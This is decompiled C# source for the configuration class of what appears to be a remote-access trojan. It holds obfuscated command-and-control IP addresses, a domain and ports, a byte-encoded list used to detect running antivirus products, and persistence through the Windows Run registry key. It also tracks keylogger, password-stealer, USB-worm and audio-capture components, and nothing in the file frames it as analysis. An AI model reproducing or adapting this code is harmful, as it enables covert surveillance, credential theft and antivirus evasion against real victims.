using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace sohirmnvrs;

internal static class sohirmnvrsCONF
{
	public static string filePath = Application.get_ExecutablePath();

	public static byte[] encAvs = new byte[220]
	{
		98, 100, 115, 115, 61, 66, 105, 116, 32, 68,
		101, 102, 101, 110, 100, 101, 114, 44, 111, 110,
		108, 105, 110, 101, 110, 116, 61, 81, 72, 101,
		97, 108, 44, 98, 100, 97, 103, 101, 110, 116,
		61, 66, 105, 116, 32, 68, 101, 102, 101, 110,
		100, 101, 114, 32, 65, 103, 101, 110, 116, 44,
		109, 115, 115, 101, 99, 101, 115, 61, 77, 83,
		32, 69, 115, 115, 101, 110, 116, 105, 97, 108,
		115, 44, 102, 115, 115, 109, 51, 50, 61, 70,
		83, 101, 99, 117, 114, 101, 44, 97, 118, 112,
		61, 75, 97, 115, 112, 101, 114, 115, 107, 121,
		44, 97, 118, 103, 110, 116, 61, 65, 118, 105,
		114, 97, 44, 115, 112, 98, 98, 99, 115, 118,
		99, 61, 83, 121, 109, 97, 110, 116, 101, 99,
		44, 117, 112, 100, 97, 116, 101, 114, 117, 105,
		61, 77, 99, 65, 102, 101, 101, 44, 97, 118,
		103, 117, 105, 61, 65, 86, 71, 44, 97, 118,
		103, 99, 99, 61, 65, 86, 71, 44, 109, 98,
		97, 109, 61, 65, 110, 116, 32, 77, 97, 108,
		119, 97, 114, 101, 44, 97, 118, 97, 115, 116,
		117, 105, 61, 65, 118, 97, 115, 116, 44, 97,
		118, 97, 115, 116, 61, 65, 118, 97, 115, 116
	};

	public static string sohirmnvrsflshPath = "\\Eldacr\\|sohirmnvrs".Split(new char[1] { '|' })[0];

	public static RegistryKey winVwe = null;

	public static string sohirmnvrssecApp = "mdlnmitas|sohirmnvrs".Split(new char[1] { '|' })[0];

	public static string sohirmnvrsdefaultP = "210.120.245.205|sohirmnvrs".Split(new char[1] { '|' })[0];

	public static string sohirmnvrsremvUser = "ndlwmnau|sohirmnvrs".Split(new char[1] { '|' })[0];

	public static string sohirmnvrskeePath = "\\Bthers\\|sohirmnvrs".Split(new char[1] { '|' })[0];

	public static string sohirmnvrsusbApp = "athwcrs|sohirmnvrs".Split(new char[1] { '|' })[0];

	public static string sohirmnvrsthiPath = "\\Hdlrnca\\|sohirmnvrs".Split(new char[1] { '|' })[0];

	public static string sohirmnvrschromDLL = "System.Data.SQLite.dll|sohirmnvrs".Split(new char[1] { '|' })[0];

	public static string sohirmnvrsmozeDLL = "mozsqlite3.dll|sohirmnvrs".Split(new char[1] { '|' })[0];

	public static string sohirmnvrsusbwrm = "wirm|sohirmnvrs".Split(new char[1] { '|' })[0];

	public static string sohirmnvrspssApp = "mathciesr|sohirmnvrs".Split(new char[1] { '|' })[0];

	public static string sohirmnvrsaudioDLL = "NAudio.dll|sohirmnvrs".Split(new char[1] { '|' })[0];

	public static string sohirmnvrskiyApp = "wtdhcos|sohirmnvrs".Split(new char[1] { '|' })[0];

	public static string sohirmnvrsmainApp = "sohirmnvrs|sohirmnvrs".Split(new char[1] { '|' })[0];

	public static string sohirmnvrspc_id = "udluar|sohirmnvrs".Split(new char[1] { '|' })[0];

	public static byte[] sohirmnvrsvpsips = new byte[32]
	{
		49, 55, 51, 46, 50, 52, 57, 46, 50, 50,
		46, 51, 48, 63, 117, 114, 111, 110, 108, 105,
		110, 101, 115, 116, 111, 114, 101, 115, 46, 110,
		101, 116
	};

	public static int sohirmnvrsport = 4228;

	public static string sohirmnvrsappPath = "\\Addalbe\\|sohirmnvrs".Split(new char[1] { '|' })[0];

	public static int port = 4228;

	public static int aport = 8686;

	public static int bport = 10864;

	public static int cport = 12655;

	public static int dport = 16582;

	public static string sohirmnvrsapver;

	public static string sohirmnvrscname = "";

	public static string sohirmnvrsuname = "";

	public static string sohirmnvrslancard = "";

	public static string sohirmnvrsuip = "";

	public static string sohirmnvrspasPath = "\\Albracs\\|sohirmnvrs".Split(new char[1] { '|' })[0];

	public static string sohirmnvrssecPath()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + sohirmnvrsthiPath;
	}

	public static string zuissloadAV()
	{
		string text = "";
		try
		{
			Process[] processes = Process.GetProcesses();
			string[] array = Encoding.UTF8.GetString(encAvs, 0, encAvs.Length).Split(new char[1] { ',' });
			for (int i = 0; i < processes.Length; i++)
			{
				string value = processes[i].ProcessName.ToLower();
				for (int j = 0; j < array.Length; j++)
				{
					if (array[j].Contains(value))
					{
						string[] array2 = array[j].Split(new char[1] { '=' });
						text = text + " " + array2[1].Trim();
					}
				}
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	public static string sohirmnvrsget_mpath()
	{
		return Path.GetDirectoryName(filePath) + "\\";
	}

	public static void sohirmnvrsInfo()
	{
		sohirmnvrsapver = "A.1.8.0!sohirmnvrs".Split(new char[1] { '!' })[0];
		sohirmnvrscname = Environment.MachineName.Replace('|', '-');
		sohirmnvrsuname = Environment.UserName.Replace('|', '-');
	}

	public static string sohirmnvrsusbPath()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + sohirmnvrsflshPath;
	}

	public static string sohirmnvrskiPath()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + sohirmnvrskeePath;
	}

	public static string sohirmnvrsOsname()
	{
		try
		{
			OperatingSystem oSVersion = Environment.OSVersion;
			return oSVersion.Version.Major + ">" + oSVersion.Version.Minor;
		}
		catch
		{
			return "6>1!sohirmnvrs".Split(new char[1] { '!' })[0];
		}
	}

	public static void sohirmnvrsset_run(string app, string path)
	{
		try
		{
			string text = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|sohirmnvrs";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text.Split(new char[1] { '|' })[0], writable: true);
			string text2 = sohirmnvrspc_id;
			object value = registryKey.GetValue(text2 + app);
			if (value == null)
			{
				registryKey.SetValue(text2 + app, path);
			}
			else if (value.ToString() != path)
			{
				registryKey.SetValue(text2 + app, path);
			}
		}
		catch
		{
		}
	}

	public static string sohirmnvrsget_ppath()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + sohirmnvrspasPath;
	}

	public static byte[] sohirmnvrsapps_status()
	{
		try
		{
			string text = "";
			string text2 = "0.0.0.0|sohirmnvrs".Split(new char[1] { '|' })[0];
			string text3 = "true!sohirmnvrs".Split(new char[1] { '!' })[0];
			text = "maina#Runing|ver#!sohirmnvrs".Split(new char[1] { '!' })[0] + sohirmnvrsapver + "|name#!sohirmnvrs".Split(new char[1] { '!' })[0] + sohirmnvrsmainApp + "|path#!sohirmnvrs".Split(new char[1] { '!' })[0] + sohirmnvrsget_mpath() + "|fileslog=!sohirmnvrs".Split(new char[1] { '!' })[0] + "N/A|apkey#!sohirmnvrs".Split(new char[1] { '!' })[0] + sohirmnvrspc_id + ">|sohirmnvrs".Split(new char[1] { '|' })[0];
			if (File.Exists(sohirmnvrskiPath() + sohirmnvrskiyApp + ".exe!sohirmnvrs".Split(new char[1] { '!' })[0]))
			{
				text2 = FileVersionInfo.GetVersionInfo(sohirmnvrskiPath() + sohirmnvrskiyApp + ".exe!sohirmnvrs".Split(new char[1] { '!' })[0]).ProductVersion;
				Process[] processesByName = Process.GetProcessesByName(sohirmnvrskiyApp);
				text3 = ((processesByName.Length != 0) ? "Runing!sohirmnvrs".Split(new char[1] { '!' })[0] : "Not Runing!sohirmnvrs".Split(new char[1] { '!' })[0]);
			}
			else
			{
				text2 = "0.0.0.0!sohirmnvrs".Split(new char[1] { '!' })[0];
				text3 = "Not Present!sohirmnvrs".Split(new char[1] { '!' })[0];
			}
			text = text + "keeap#!sohirmnvrs".Split(new char[1] { '!' })[0] + text3 + "|ver#!sohirmnvrs".Split(new char[1] { '!' })[0] + text2 + "|name#!sohirmnvrs".Split(new char[1] { '!' })[0] + sohirmnvrskiyApp + "|path#!sohirmnvrs".Split(new char[1] { '!' })[0] + sohirmnvrskiPath() + "|logfile#!sohirmnvrs".Split(new char[1] { '!' })[0] + sohirmnvrskiyApp + ">|sohirmnvrs".Split(new char[1] { '|' })[0];
			if (File.Exists(sohirmnvrsget_ppath() + sohirmnvrspssApp + ".exe!sohirmnvrs".Split(new char[1] { '!' })[0]))
			{
				text2 = FileVersionInfo.GetVersionInfo(sohirmnvrsget_ppath() + sohirmnvrspssApp + ".exe!sohirmnvrs".Split(new char[1] { '!' })[0]).ProductVersion;
				text3 = "Present!sohirmnvrs".Split(new char[1] { '!' })[0];
			}
			else
			{
				text2 = "0.0.0.0!sohirmnvrs".Split(new char[1] { '!' })[0];
				text3 = "Not Present!sohirmnvrs".Split(new char[1] { '!' })[0];
			}
			text = text + "pasap#!sohirmnvrs".Split(new char[1] { '!' })[0] + text3 + "|ver#!sohirmnvrs".Split(new char[1] { '!' })[0] + text2 + "|name#!sohirmnvrs".Split(new char[1] { '!' })[0] + sohirmnvrspssApp + "|path#!sohirmnvrs".Split(new char[1] { '!' })[0] + sohirmnvrsget_ppath() + "|logfile#!sohirmnvrs".Split(new char[1] { '!' })[0] + sohirmnvrspssApp + ">|sohirmnvrs".Split(new char[1] { '|' })[0];
			if (File.Exists(sohirmnvrssecPath() + sohirmnvrssecApp + ".exe!sohirmnvrs".Split(new char[1] { '!' })[0]))
			{
				text2 = FileVersionInfo.GetVersionInfo(sohirmnvrssecPath() + sohirmnvrssecApp + ".exe!sohirmnvrs".Split(new char[1] { '!' })[0]).ProductVersion;
				Process[] processesByName = Process.GetProcessesByName(sohirmnvrssecApp);
				text3 = ((processesByName.Length != 0) ? "Runing!sohirmnvrs".Split(new char[1] { '!' })[0] : "Not Runing!sohirmnvrs".Split(new char[1] { '!' })[0]);
			}
			else
			{
				text2 = "0.0.0.0!sohirmnvrs".Split(new char[1] { '!' })[0];
				text3 = "Not Present!sohirmnvrs".Split(new char[1] { '!' })[0];
			}
			text = text + "secap#!sohirmnvrs".Split(new char[1] { '!' })[0] + text3 + "|ver#!sohirmnvrs".Split(new char[1] { '!' })[0] + text2 + "|name#!sohirmnvrs".Split(new char[1] { '!' })[0] + sohirmnvrssecApp + "|path#!sohirmnvrs".Split(new char[1] { '!' })[0] + sohirmnvrssecPath() + "|logfile#!sohirmnvrs".Split(new char[1] { '!' })[0] + sohirmnvrssecApp + ">|sohirmnvrs".Split(new char[1] { '|' })[0];
			if (File.Exists(sohirmnvrsusbPath() + sohirmnvrsusbApp + ".exe!sohirmnvrs".Split(new char[1] { '!' })[0]))
			{
				text2 = FileVersionInfo.GetVersionInfo(sohirmnvrsusbPath() + sohirmnvrsusbApp + ".exe!sohirmnvrs".Split(new char[1] { '!' })[0]).ProductVersion;
				Process[] processesByName = Process.GetProcessesByName(sohirmnvrsusbApp);
				text3 = ((processesByName.Length != 0) ? "Runing!sohirmnvrs".Split(new char[1] { '!' })[0] : "Not Runing!sohirmnvrs".Split(new char[1] { '!' })[0]);
			}
			else
			{
				text2 = "0.0.0.0!sohirmnvrs".Split(new char[1] { '!' })[0];
				text3 = "Not Present!sohirmnvrs".Split(new char[1] { '!' })[0];
			}
			text = text + "usbap#!sohirmnvrs".Split(new char[1] { '!' })[0] + text3 + "|ver#!sohirmnvrs".Split(new char[1] { '!' })[0] + text2 + "|name#!sohirmnvrs".Split(new char[1] { '!' })[0] + sohirmnvrsusbApp + "|path#!sohirmnvrs".Split(new char[1] { '!' })[0] + sohirmnvrsusbPath() + "|logfile#!sohirmnvrs".Split(new char[1] { '!' })[0] + sohirmnvrsusbApp + "|usbwrm#!sohirmnvrs".Split(new char[1] { '!' })[0] + sohirmnvrsusbwrm + ">|sohirmnvrs".Split(new char[1] { '|' })[0];
			return Encoding.UTF8.GetBytes(text);
		}
		catch
		{
			return null;
		}
	}
}
